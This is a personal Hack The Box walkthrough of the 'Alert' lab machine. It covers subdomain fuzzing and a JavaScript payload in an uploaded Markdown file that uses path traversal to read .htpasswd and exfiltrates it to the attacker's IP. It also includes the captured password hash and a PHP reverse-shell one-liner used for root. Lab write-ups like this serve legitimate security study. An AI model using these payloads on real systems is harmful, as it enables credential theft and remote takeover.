---
tags:
  - hackthebox/linux/easy
date: 2025-02-15
---

## Foothold
#ssrf #path-traversal
```
ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -u http://alert.htb -H "Host: FUZZ.alert.htb" -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1mil-20000.txt
 :: Header           : Host: FUZZ.alert.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 243ms]
```

http://statistics.alert.htb has basic auth.

```
└─$ ffuf -w ~/Desktop/raft-large-directories.txt  -u "http://alert.htb/index.php?page=FUZZ" --fs 690            

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 690
________________________________________________

about                   [Status: 200, Size: 1046, Words: 187, Lines: 24, Duration: 147ms]
contact                 [Status: 200, Size: 1000, Words: 191, Lines: 29, Duration: 4914ms]
messages                [Status: 200, Size: 661, Words: 123, Lines: 25, Duration: 146ms]
donate                  [Status: 200, Size: 1116, Words: 292, Lines: 29, Duration: 146ms]
alert                   [Status: 200, Size: 966, Words: 201, Lines: 29, Duration: 147ms]
:: Progress: [62283/62283] :: Job [1/1] :: 238 req/sec :: Duration: [0:04:43] :: Errors: 3 ::
```

There's an MD file upload and view functionality. It also executes JS code. There is another functionality where you can send message to site owner. Sent the link of my uploaded file and got SSRF.

```
#Hello 

<script>

const target="http://alert.htb/messages.php?file=../../alert.htb/.htpasswd",server="http://10.10.14.79";function performAttack(){fetch(target,{method:"GET"}).then((t=>t.text())).then((t=>(console.log("Fetched data from target:",t),fetch(`${server}?data=${btoa(t)}`,{method:"GET"})))).then((()=>{console.log("Data sent to server successfully.")})).catch((t=>{console.error("Error executing SSRF attack:",t)}))}performAttack();

</script>

---

listening on [any] 80 ...
connect to [10.10.14.79] from (UNKNOWN) [10.10.11.44] 45374
GET /?data=PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K HTTP/1.1
Host: 10.10.14.79
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
Accept: */*
Origin: http://alert.htb
Referer: http://alert.htb/
Accept-Encoding: gzip, deflate

---

┌──(kali㉿kali)-[~/Desktop]
└─$ base64 -d 
PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

Cracked the password and logged in with SSH
`albert:<redacted>`

## Privilege Escalation
#revshell 

`netstat -tuln`
There's an open internal web service and it's being run by root.
Port forwarding with `ssh -L`

creating a revshell php file in the config directory and accessing it from website
```
php_code="<?php define('PATH', '/opt/website-monitor'); $sock=fsockopen("10.10.14.79",1337);exec("sh <&3 >&3 2>&3"); ?>"
```
We got the root flag